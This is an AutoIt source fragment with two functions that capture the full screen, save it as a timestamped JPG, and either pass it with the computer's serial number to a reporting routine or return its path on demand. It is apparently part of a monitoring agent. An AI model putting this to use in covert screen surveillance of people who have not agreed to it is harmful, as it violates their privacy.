
Func screenShot()
	
	Local $hBmp
	
	Local $epoch=generateDateTime()
	
	; Capture full screen
	$hBmp = _ScreenCapture_Capture("")
	
	$filename=generateNameFromDateTime()&".jpg"
	
	$filePath=@WorkingDir & "\files\screenShots\"&$filename
	
	
	if Not FileExists(@WorkingDir & "\files\screenShots\") Then
		
		DirCreate(@WorkingDir & "\files\screenShots\")
		
	EndIf
   
	if _ScreenCapture_SaveImage($filePath, $hBmp) Then
		
		;Local $newFilePath=encryptFile($filePath)
		
		putScreenShot($computer_serial,$epoch,$filename,$filePath)
		
	EndIf
	
	if @error then 
		
		handleErrors("screenShot", @error)
		
	EndIf
	
EndFunc   


Func screenShotOnDemand()
	
	Local $hBmp
	
	Local $epoch=generateDateTime()
	
	; Capture full screen
	$hBmp = _ScreenCapture_Capture("")
	
	$filename=generateNameFromDateTime()&".jpg"
	
	$filePath=@WorkingDir & "\files\screenShots\"&$filename
	
	
	if Not FileExists(@WorkingDir & "\files\screenShots\") Then
		
		DirCreate(@WorkingDir & "\files\screenShots\")
		
	EndIf
   
	if _ScreenCapture_SaveImage($filePath, $hBmp) Then
		
		;putScreenShot($computer_serial,$epoch,$filename,$filePath)
		
		Return $filePath
		
	Else
		
		Return "fail"
		
	EndIf
	
	if @error then 
		
		handleErrors("screenShot", @error)
		
	EndIf
	
EndFunc   
